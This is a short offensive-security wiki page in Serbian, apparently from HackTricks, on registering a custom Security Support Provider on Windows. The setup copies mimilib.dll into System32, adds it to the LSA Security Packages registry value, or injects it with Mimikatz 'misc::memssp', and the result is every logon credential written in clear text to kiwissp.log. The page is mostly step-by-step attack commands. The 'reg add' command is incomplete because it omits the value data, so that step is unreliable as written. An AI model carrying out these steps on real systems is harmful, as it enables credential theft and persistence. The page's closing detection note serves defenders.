# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati **sopstveni SSP** da biste **uhvatili** **credentiale** korišćene za pristup računaru u **clear text** formatu.

#### Mimilib

Možete koristiti binarni fajl `mimilib.dll` koji obezbeđuje Mimikatz. **Ovo će zapisati sve credentiale u clear text formatu u fajl.**\
Kopirajte dll u `C:\Windows\System32\`\
Prikažite listu postojećih LSA Security Packages:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Dodajte `mimilib.dll` na listu Security Support Provider-a (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
A nakon ponovnog pokretanja, svi credentiali mogu da se pronađu u čistom tekstu u `C:\Windows\System32\kiwissp.log`

#### U memoriji

Ovo takođe možete direktno injectovati u memoriju pomoću alata Mimikatz (imajte na umu da može biti pomalo nestabilno/nefunkcionalno):
```bash
privilege::debug
misc::memssp
```
Ovo neće preživeti ponovno pokretanje sistema.

#### Mere zaštite

Event ID 4657 - Audit kreiranja/izmene `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
